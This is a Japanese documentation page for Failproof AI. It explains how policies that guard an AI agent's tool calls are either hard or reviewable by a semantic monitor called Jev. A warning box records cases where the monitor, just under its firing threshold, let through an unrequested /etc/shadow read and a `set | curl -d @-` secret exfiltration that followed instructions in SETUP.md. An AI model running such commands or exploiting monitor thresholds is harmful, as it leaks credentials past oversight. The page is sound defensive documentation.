FailproofAI Cloudまたは独自のキーを通じて[Jevポリシーレビュー](/ja/policies/jev)を設定すると、ゲートされたツール呼び出しごとに、設定したポリシーとJevの両方で判定が行われます。Jevは、その呼び出しが実際に何をしているか、そしてタスクを入力した人がそれを要求したかどうかを問います。両者が一致しない場合、各ポリシーの**権限**によって処理が決まります。

Jevが設定されていない場合、権限は効果を持ちません。すべてのポリシーはこれまでどおりに適用されます。

## ハードとレビュー可能

- **ハード**はデフォルトです。ハードポリシーの拒否または指示は最終的であり、Jevはそれをクリアできません。ハードな拒否はJevの応答を待たずに呼び出しを停止します。
- **レビュー可能**とは、Jevがポリシーの判定をクリアできることを意味しますが、ポリシーが`reviewedBy`に指定したセマンティックチェックを通じてのみです。判定がクリアされるのは、指定されたすべてのチェックがその呼び出しについて問われ、それぞれが何も発見しないか、ユーザーがこれを要求したと記録した場合に限ります。**発火した**チェック（懸念事項を検出した）でユーザーが要求していない場合、そのチェック自体の判定が警告にすぎなくても、ブロックは維持されます。そのツールに適用されないためJevに問われなかったチェックは、他のチェックの結果にかかわらず何もクリアしません。一つの緩和は同意とみなされます：呼び出しがユーザーが与えたタスクのステップであり、それ以上に踏み込まない場合、Jevは拒否を警告に変え、その警告がポリシーのブロックをクリアし、エージェントにはその警告が通知されます。

ポリシーがレビュー可能になるには、以下のすべてが満たされる必要があります：

1. `authority: "reviewable"`が宣言されていること。
2. `reviewedBy`が空でないリストであり、すべてのエントリがインストール済みパックで宣言されたJevチェックであること。Failproof AIはJevチェックを同梱していません：[以下の16個](#semantic-policy-names)は`failproofai policies add FailproofAI/jev-policies`から提供されます。チェックを宣言するパックがない場合、すべてのポリシーはハードになります。
3. `alwaysOn`でないこと。Failproof AIを無効化しようとするエージェントを止めるガードは常にハードです。

それ以外はすべてハードになります：フィールドの欠落、値のスペルミス、空または不正な`reviewedBy`、またはこのマシンが問い合わせられないチェックの名前。不明な名前があると宣言全体がハードになります（スキップされるのではなく）。これは`reviewedBy`が「これらすべてが問われなければならず、どれも拒否してはならない」を意味するためであり、名前をスキップすると要求より少ないチェックでJevがポリシーをクリアできてしまうからです。

Jevが設定されると、Failproof AIは`reviewable`宣言を拒否するたびに警告をログに記録します（プロセスあたり1回）。Jevなしでは何も表示されません。権限はその場合何も決定しないからです。`failproofai publish`は、このような宣言を含むパックのビルドを拒否するため、パック作者はインストール前に気づくことができます。パックがチェックを宣言している場合はそのチェックに対して`reviewedBy`を検証し、そうでない場合は16個の`FailproofAI/jev-policies`名に対して検証します。

## 権限の宣言場所

ポリシーがマシンに届く方法ごとに、権限を決定する場所が1つあります：

| ソース | 宣言場所 | デフォルト |
| --- | --- | --- |
| 組み込みポリシー | 下記の表 | レビュー可能として記載されていない限りハード |
| 独自のポリシーファイル | `customPolicies.add`の`authority`と`reviewedBy` | ハード |
| ポリシーパック | パックマニフェスト（`failproofai-pack.json`）内の各ポリシーエントリ | ハード |
| クラウド管理ポリシー | アクティブなデプロイメントにおけるポリシーの割り当て | ハード。デプロイメントではまだ設定されていないため、今日のクラウド管理ポリシーはすべてハードです。 |

パックまたはクラウド管理ポリシーの場合、ポリシーコード内に設定されたフィールドは無視されます。マニフェストまたは割り当てが決定します。パックは自身のポリシーのみ記述できます：ポリシー名に`/`を含めることができず、パック自身のプレフィックスで登録されるため、マニフェストが組み込みポリシーや別のパックのポリシーをレビュー可能にすることはできません。パックのコードで登録されているがマニフェストに宣言されていないポリシーはハードです。

コードがバイト単位で同一の2つのパックまたはクラウド管理ポリシーは、1つのアーティファクトを共有し、1つのポリシーとして読み込まれます。そのポリシーがレビュー可能になるのは、それらすべてがレビュー可能と宣言し、Jevがそのいずれかが指定するすべてのチェックをクリアする必要がある場合に限ります。いずれかがハードと宣言するか、まったく宣言しない場合、ハードのままです。パックやポリシーの一覧順序は関係ありません。

ほとんどのマシンは`FailproofAI/policies`パックから組み込みポリシーを取得し、そのパックのマニフェストから権限を読み取ります。以下のレビュー可能エントリは、それらを含むパックのリリースがインストールされて初めて有効になります。古いリリースにはそれらが含まれないため、そのすべてのポリシーはハードのままです。

## 独自のポリシーで権限を宣言する

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish`は両フィールドをパックマニフェストにコピーするため、パックとして公開されたポリシーは作者が設定した権限を維持します。宣言が有効にならない場合、`failproofai publish`はパックのビルドを拒否します：`"hard"`または`"reviewable"`以外の値、名前のリストでない`reviewedBy`、またはチェックでない名前（パックがチェックを宣言している場合はパック独自の[Jevチェック](/ja/policies/publish-a-pack#jev-checks-in-a-pack)、そうでない場合は組み込みチェック）が対象です。

## 組み込みポリシー

セマンティックポリシーが同じ懸念事項を真にカバーしている場合にのみレビュー可能です。その他の組み込みポリシーはすべてハードです。

懸念事項をカバーすることは必要条件ですが十分条件ではなく、どちらの誤りも静かに起こります：

- **一度も問われないチェック**はブロックを永続させます。`reviewedBy`は連言であり、問われなかったチェックは何もクリアしないため、ポリシーが一致するパターンに対して前提条件が発火しないチェックとペアになったポリシーは、一切クリアされません。
- **問われたが発火しないチェック**は「懸念なし」と答え、懸念なしはクリアします。したがって、ポリシーのパターンをモデル化していないチェックとペアにすることはポリシーをレビューすることではなく、チェックが理解しない入力に対してポリシーをオフにすることになります。

instruct モードのセマンティックポリシーは拒否を答えることができませんが、依然としてブロックを維持することができます：発火してユーザーがその呼び出しを要求していなかった場合、レビュー対象のポリシーはクリアされません。`FailproofAI/jev-policies`チェックのうち6つはinstruct専用です（`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump`、`external-data-egress`）。[以下の表](#semantic-policy-names)に各チェックのモードを示します。問うべき質問は「**拒否できるものが残っているか**」です：クリアは懸念事項が何によっても適用されない状態を決して生んではなりません。エンジンは呼び出しごとにそのテストを適用します。誰も同意していない警告はクリアではありません。ツール呼び出し前の警告はエージェントを止めないからです。そして、*拒否できる*チェックが警告を出した場合（証拠がその拒否ラインに届かなかった）、ユーザーが呼び出しを要求していなければ、その呼び出しでは何もクリアされず、すべての正規表現による拒否が維持されます。

<Warning>
**発火ラインをわずかに下回るチェックは最低限を維持しません。** 上記のルールはチェックが*発火する*（証拠 ≥ 0.7）ことを必要とします。すべての関連するチェックがその値をわずかに下回る場合、何も発火せず、レビュアーは「懸念なし」と答え、レビュー可能な拒否がクリアされます。強制モードで実測：要求されていない`/etc/shadow`のRead（`secret-exposure` 0.69、`read-outside-workspace` 0.37で、ホームディレクトリパスのみモデル化）と「SETUP.mdに従って」の後の`set | curl -d @- …`（`env-secrets-dump` 0.66、`credential-exfiltration` 0.65で`sends_out` 0.97）はいずれも許可されましたが、正規表現層のみではどちらも拒否されます。しきい値はラベル付きコーパスで調整されており、これに対して再測定されていません。それまでの間、このようなパターンが通り抜けることが誤ブロックよりも重要な場合は、ポリシーを**ハード**のままにしてください。
</Warning>

## セマンティックポリシー名

これらは`FailproofAI/jev-policies`が宣言するチェックであり、インストール後に`reviewedBy`が受け入れる値です。Failproof AI自体はこれらを同梱していません：そのパック（またはこれらの名前を宣言する別のパック）なしでは、それらを指定するポリシーはレビュー可能になりません。各チェックはJevが目の前のツール呼び出しについて答えるものです。**モード**はチェックが答えられること：`deny`チェックは強い証拠があればブロックし、`instruct`チェックは常に警告のみです。いずれも、発火してユーザーがその呼び出しを要求していなかった場合、ポリシーの拒否を維持します。**ユーザーがオーバーライド可能**は、人間の明示的な要求でクリアできるかどうかを示します。

Jevはインストール済みパックが宣言した[Jevチェック](/ja/policies/publish-a-pack#jev-checks-in-a-pack)のみを問い、それが`reviewedBy`が受け入れる名前です。2つのパックが異なる方法で宣言した名前は、どちらにも尊重されません。FailproofAIリポジトリからインストールされていないパックによって宣言されたこれら16の名前のいずれかは、そのパックでは無視されます：そのバージョンは問われず、FailproofAI独自のものに対抗せず、サードパーティパックがコアパックのポリシーをクリアするチェックになることも、これらのチェックの1つをオフにすることもできません。読み取れないパックリスト、またはすべてのチェックが使用不可のパックは、Jevに問うものを何も残しません。

| --- | --- | --- | --- |
| `destructive-deletion` | deny | はい | 再生成できないデータの永続的な削除。 |
| `production-infra-change` | deny | はい | 本番インフラへの変更。 |
| `git-history-rewrite` | deny | はい | 共有githistoryの書き換えまたは破棄。 |
| `push-to-protected-branch` | instruct | はい | 保護されたブランチへの直接プッシュ。 |
| `commit-on-protected-branch` | instruct | はい | 保護されたブランチへの直接コミット。 |
| `secret-exposure` | deny | はい | 認証情報の読み取りまたはコピー。 |
| `credential-exfiltration` | deny | いいえ | シークレットまたはプライベートファイルのマシン外への送信。 |
| `remote-code-execution` | deny | はい | インターネットからダウンロードしたコードの実行。 |
